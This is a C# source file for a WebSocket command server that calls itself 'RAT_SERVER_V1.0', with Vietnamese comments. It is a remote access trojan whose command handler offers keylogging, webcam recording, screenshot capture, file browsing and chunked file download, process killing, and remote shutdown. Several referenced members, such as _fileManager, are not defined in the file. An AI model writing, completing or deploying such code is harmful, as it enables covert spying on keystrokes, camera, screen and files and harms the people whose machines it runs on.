using System;
using System.Diagnostics;
using System.Net;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Linq;
using System.Text.Json;
using System.IO;
using System.Collections.Generic;

namespace WebSocketTest
{
    public class SimpleWebSocketServer
    {
        private HttpListener? _listener;
        private Core.Server? _server;
        private Core.Router? _router;
        private readonly Action<string> _logger = _ => { };
        private WebSocket? _currentSocket;
        private bool _isRunning = false;
        private readonly SemaphoreSlim _sendSemaphore = new SemaphoreSlim(1, 1); // Đồng bộ SendAsync
        public SimpleWebSocketServer(Action<string> loggerMethod)
        {
            if (loggerMethod == null) throw new ArgumentNullException(nameof(loggerMethod));
            _logger = loggerMethod;

            // Default root
            string homeDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            // Try preferred root (C:\) but keep fallback if it fails
            string root = homeDir;
            try
            {
                // prefer C:\ if available
                if (Directory.Exists("C:\\")) root = @"C:\";
            }
            catch { }

            // Initialize services and router
            var appService = new Services.AppService();
            var processService = new Services.ProcessService();
            var fileService = new Services.FileService(root, maxStreamFileSizeBytes: 500L * 1024 * 1024);
            var screenService = new Services.ScreenService();
            var webcamService = new Services.WebcamService();

            _router = new Core.Router(appService, processService, fileService, screenService, webcamService, SendToClientAsync);
        }

        // Trong hàm Start(), xử lý HTTP request song song với WebSocket
        public async void Start(string url)
        {
            // Delegate lifecycle to Core.Server while keeping backwards-compatible wrapper
            _server = new Core.Server(_logger);
            _ = _server.Start(url, ProcessClient);
        }

        // NOTE: health check handled by Core.Server; leave HandleHealthCheck in place for parity
        private async Task HandleHealthCheck(HttpListenerContext context)
        {
            var response = new 
            { 
                status = "ok", 
                server = "RAT_SERVER_V1.0",
                version = "1.0"
            };
            
            byte[] buffer = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(response));
            context.Response.ContentType = "application/json";
            context.Response.ContentLength64 = buffer.Length;
            context.Response.StatusCode = 200;
            
            await context.Response.OutputStream.WriteAsync(buffer, 0, buffer.Length);
            context.Response.Close();
        }

        public void Stop()
        {
            _server?.Stop();
        }
        

        private async Task ProcessClient(HttpListenerContext context)
        {
            var wsContext = await context.AcceptWebSocketAsync(null);
            _currentSocket = wsContext.WebSocket;
            _logger("Client đã kết nối!");
            // ✅ GỬI HANDSHAKE NGAY KHI KẾT NỐI
            var handshake = new 
            { 
                type = "handshake", 
                server_name = "RAT_SERVER_V1.0",
                version = "1.0",
                timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
            };
            await SendToClient(JsonSerializer.Serialize(handshake));

            byte[] buffer = new byte[1024 * 1024]; // 1MB buffer cho dữ liệu lớn

            try
            {
                while (_currentSocket.State == WebSocketState.Open)
                {
                    var result = await _currentSocket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                    if (result.MessageType == WebSocketMessageType.Close) break;

                    string message = Encoding.UTF8.GetString(buffer, 0, result.Count);
                    _logger($"[Client]: {message}");

                    string response = _router != null ? _router.Dispatch(message) : HandleCommand(message);
                    await SendToClient(response);
                }
            }
            catch (OperationCanceledException) { _logger("Client timeout hoặc disconnect"); }
            catch (WebSocketException ex) { _logger($"WebSocket error: {ex.Message}"); }
            catch (Exception ex) { _logger("Lỗi kết nối: " + ex.Message); }
            finally 
            { 
                // Gracefully close WebSocket
                if (_currentSocket != null)
                {
                    try
                    {
                        if (_currentSocket.State == WebSocketState.Open)
                        {
                            await _currentSocket.CloseAsync(WebSocketCloseStatus.NormalClosure, "Server closing", CancellationToken.None);
                        }
                    }
                    catch { }
                    finally
                    {
                        _currentSocket.Dispose();
                        _currentSocket = null;
                    }
                }
            }
        }

        public async Task SendToClient(string msg)
        {
            if (_currentSocket != null && _currentSocket.State == WebSocketState.Open)
            {
                byte[] bytes = Encoding.UTF8.GetBytes(msg);
                try
                {
                    await _sendSemaphore.WaitAsync();
                    try
                    {
                        await _currentSocket.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, CancellationToken.None);
                    }
                    finally
                    {
                        _sendSemaphore.Release();
                    }
                }
                catch (Exception ex)
                {
                    _logger($"Lỗi gửi: {ex.Message}");
                }
            }
        }

        // Gửi dữ liệu lớn (video, ảnh) thành nhiều chunks
        public async Task SendLargeData(List<string> frameList, string type)
        {
            if (_currentSocket == null || _currentSocket.State != WebSocketState.Open) return;

            try
            {
                // Gửi thông báo bắt đầu
                var startMsg = new { type = type + "_start", count = frameList.Count };
                await SendToClientAsync(JsonSerializer.Serialize(startMsg));

                // Gửi frames theo batch (30 frames một lần) để tăng tốc độ
                const int batchSize = 30;
                for (int batchStart = 0; batchStart < frameList.Count; batchStart += batchSize)
                {
                    if (_currentSocket.State != WebSocketState.Open) 
                    {
                        _logger($"WebSocket closed at batch {batchStart}/{frameList.Count}");
                        break;
                    }

                    int batchEnd = Math.Min(batchStart + batchSize, frameList.Count);
                    var batch = new List<object>();
                    
                    for (int i = batchStart; i < batchEnd; i++)
                    {
                        batch.Add(new { index = i, data = frameList[i] });
                    }

                    try
                    {
                        var batchData = new { type = type + "_batch", frames = batch };
                        string json = JsonSerializer.Serialize(batchData);
                        byte[] bytes = Encoding.UTF8.GetBytes(json);

                        await _sendSemaphore.WaitAsync();
                        try
                        {
                            await _currentSocket.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, CancellationToken.None);
                        }
                        finally
                        {
                            _sendSemaphore.Release();
                        }
                    }
                    catch (Exception ex)
                    {
                        _logger($"Lỗi gửi batch {batchStart}-{batchEnd}: {ex.Message}");
                        break;
                    }
                    
                    // Delay nhỏ giữa batches (không cần delay cho mỗi frame)
                    if (batchEnd < frameList.Count) await Task.Delay(10);
                }

                // Gửi thông báo kết thúc (nếu còn connected)
                if (_currentSocket.State == WebSocketState.Open)
                {
                    var endMsg = new { type = type + "_end" };
                    await SendToClientAsync(JsonSerializer.Serialize(endMsg));
                    _logger($"Gửi {frameList.Count} frames ({type}) thành công");
                }
            }
            catch (Exception ex)
            {
                _logger($"Lỗi gửi dữ liệu lớn: {ex.Message}");
            }
        }

        // SendToClientAsync dùng semaphore - dùng cho async context
        private async Task SendToClientAsync(string msg)
        {
            if (_currentSocket != null && _currentSocket.State == WebSocketState.Open)
            {
                byte[] bytes = Encoding.UTF8.GetBytes(msg);
                try
                {
                    await _sendSemaphore.WaitAsync();
                    try
                    {
                        await _currentSocket.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, CancellationToken.None);
                    }
                    finally
                    {
                        _sendSemaphore.Release();
                    }
                }
                catch (Exception ex)
                {
                    _logger($"Lỗi gửi: {ex.Message}");
                }
            }
        }

        // --- XỬ LÝ LỆNH ---
        private string HandleCommand(string command)
        {
            string[] parts = command.Split(new char[] { ' ' }, 2);
            string cmd = parts[0].Trim();
            string arg = parts.Length > 1 ? parts[1].Trim() : "";

            try
            {
                switch (cmd)
                {
                    // === NHÓM APP (Thao tác theo Tên) ===
                    case "listApps":
                        return GetApplicationList();
                    case "stopApp": // Dừng App theo tên (Graceful close nếu có thể)
                        return StopAppByName(arg);
                    case "startApp":
                        return StartApp(arg);

                    // === NHÓM PROCESS (Thao tác theo PID - Mới) ===
                    case "listProcesses":
                        return GetFullProcessList();
                    case "killProcess": // Diệt Process theo ID (Force kill)
                        if (int.TryParse(arg, out int pid)) return KillProcessByPid(pid);
                        return JsonError("PID phải là số");

                    case "list_dir":
                        // arg = path
                        // Run listing asynchronously and send via websocket
                        var listSocket = _currentSocket;
                        _ = Task.Run(async () =>
                        {
                            try
                            {
                                var entries = await _fileManager.ListDirectoryAsync(arg);
                                var items = entries.Select(e => new
                                {
                                    name = e.Name,
                                    fullPath = e.FullPath,
                                    isDirectory = e.IsDirectory,
                                    size = e.Size,
                                    lastModified = e.LastModified
                                }).ToList();

                                var payload = new { type = "file_list", path = arg, items = items };
                                string json = JsonSerializer.Serialize(payload);
                                if (listSocket?.State == WebSocketState.Open) await SendToClientAsync(json);
                            }
                            catch (Exception ex)
                            {
                                if (listSocket?.State == WebSocketState.Open) await SendToClientAsync(JsonError("List error: " + ex.Message));
                            }
                        });
                        return JsonInfo("Listing directory...");

                    case "download_file":
                        var dlSocket = _currentSocket;
                        _ = Task.Run(async () => {
                            try {
                                _logger($"[DOWNLOAD] Request for: {arg}");
                                var meta = await _fileManager.GetFileMetadataAsync(arg);
                                
                                if (dlSocket?.State != WebSocketState.Open) return;
                                
                                var start = new { type = "file_start", path = arg, size = meta.Size, contentType = meta.ContentType };
                                _logger($"[DOWNLOAD] Sending file_start: {JsonSerializer.Serialize(start)}");
                                await SendToClientAsync(JsonSerializer.Serialize(start));
                                
                                await using var fs = await _fileManager.GetFileStreamAsync(arg);
                                byte[] buffer = new byte[64 * 1024];
                                int read;
                                int index = 0;
                                int totalChunks = 0;
                                
                                while ((read = await fs.ReadAsync(buffer, 0, buffer.Length)) > 0) {
                                    if (dlSocket?.State != WebSocketState.Open) {
                                        _logger($"[DOWNLOAD] Connection closed at chunk {index}");
                                        break;
                                    }
                                    
                                    string b64 = Convert.ToBase64String(buffer, 0, read);
                                    var chunk = new { type = "file_chunk", index = index, path = arg, data = b64 };
                                    _logger($"[DOWNLOAD] Sending chunk {index}: {read} bytes, base64 length: {b64.Length}");
                                    await SendToClientAsync(JsonSerializer.Serialize(chunk));
                                    index++;
                                    totalChunks++;
                                    
                                    if (totalChunks % 10 == 0) {
                                        _logger($"[DOWNLOAD] Sent {totalChunks} chunks for {arg}");
                                    }
                                }
                                
                                if (dlSocket?.State == WebSocketState.Open) {
                                    var end = new { type = "file_end", path = arg, totalChunks = totalChunks };
                                    _logger($"[DOWNLOAD] Sending file_end: {totalChunks} chunks");
                                    await SendToClientAsync(JsonSerializer.Serialize(end));
                                }
                            }
                            catch (Exception ex) {
                                _logger($"[DOWNLOAD] Error: {ex.Message}");
                                if (dlSocket?.State == WebSocketState.Open) 
                                    await SendToClientAsync(JsonError($"Download error: {ex.Message}"));
                            }
                        });
                        return JsonInfo("Starting download...");
                    default:
                        if (cmd == "PING") return "PONG";
                        return command;
                    // === CHỤP MÀN HÌNH ===
                    case "get_screen":
                        // 1. Gọi hàm chụp ảnh từ file ScreenCapture.cs
                        string base64Image = ScreenCapture.GetScreenshotBase64();

                        if (base64Image.StartsWith("ERROR"))
                        {
                            return JsonError("Lỗi chụp màn hình: " + base64Image);
                        }

                        // 2. Trả về JSON chứa dữ liệu ảnh
                        // Lưu ý: Dữ liệu ảnh rất dài, nên gửi dạng JSON đặc biệt
                        return $"{{\"type\": \"screen_capture\", \"data\": \"{base64Image}\"}}";
                    // --- KEYLOGGER COMMANDS ---
                    case "keylog_start":
                        KeyLoggerService.Start();
                        return JsonSuccess("Đã bắt đầu ghi phím (Keylogger Started).");

                    case "keylog_stop":
                        KeyLoggerService.Stop();
                        return JsonSuccess("Đã dừng ghi phím.");

                    case "keylog_get":
                        string logs = KeyLoggerService.GetLogs();
                        // Cần encode JSON cẩn thận vì log có thể chứa ký tự xuống dòng
                        string safeLogs = logs.Replace("\r", "").Replace("\n", "\\n").Replace("\"", "\\\"");
                        return $"{{\"type\": \"keylog_data\", \"data\": \"{safeLogs}\"}}";
                    
                    case "keylog_clear":
                        KeyLoggerService.ClearLogs();
                        return JsonSuccess("Đã xóa file log.");
                    // --- SHUTDOWN / RESTART COMMANDS ---
                    case "shutdown":
                        ShutdownRestart.Shutdown();
                        return JsonSuccess("Lệnh tắt máy đã được gửi."); 
                    case "restart":
                        ShutdownRestart.Restart();
                        return JsonSuccess("Lệnh khởi động lại đã được gửi.");   
                    case "get_cam":
                        // Chạy bất đồng bộ để không treo server (timeout 8 giây)
                        // LỰU socket trước để tránh null khi chạy async
                        var socket = _currentSocket;
                        _ = Task.Run(async () => 
                        {
                            try
                            {
                                // Gửi thông báo bắt đầu
                                if (socket?.State == WebSocketState.Open)
                                {
                                    await SendToClient(JsonInfo("Đang quay video (5s)..."));
                                }

                                // Gọi hàm mới lấy danh sách frame (timeout 7s)
                                var frames = WebcamRecorder.RecordFrames(7000);

                                if (frames == null || frames.Count == 0)
                                {
                                    if (socket?.State == WebSocketState.Open)
                                        await SendToClient(JsonError("Lỗi: Không thể mở Webcam hoặc không ghi được frame nào."));
                                }
                                else
                                {
                                    // Gửi video dưới dạng chunks để tránh disconnect
                                    if (socket?.State == WebSocketState.Open)
                                        await SendLargeData(frames, "video");
                                }
                            }
                            catch (Exception ex)
                            {
                                if (socket?.State == WebSocketState.Open)
                                    await SendToClient(JsonError($"Lỗi camera: {ex.Message}"));
                            }
                        });
                    return JsonInfo("Đang khởi động Camera...");
                }
            }
            catch (Exception ex) { return JsonError("Lỗi Server: " + ex.Message); }
        }

        // --- LOGIC APP ---
// Legacy handlers were moved to Legacy/OldCommandHandlers.cs to keep repository tidy and avoid duplication

        // Helpers
        private string JsonSuccess(string msg) => $"{{\"trang_thai\": \"thanh_cong\", \"thong_bao\": \"{msg}\"}}";
        private string JsonError(string msg) => $"{{\"trang_thai\": \"loi\", \"thong_bao\": \"{msg}\"}}";
        private string JsonInfo(string msg) => $"{{\"trang_thai\": \"info\", \"thong_bao\": \"{msg}\"}}";
    }
}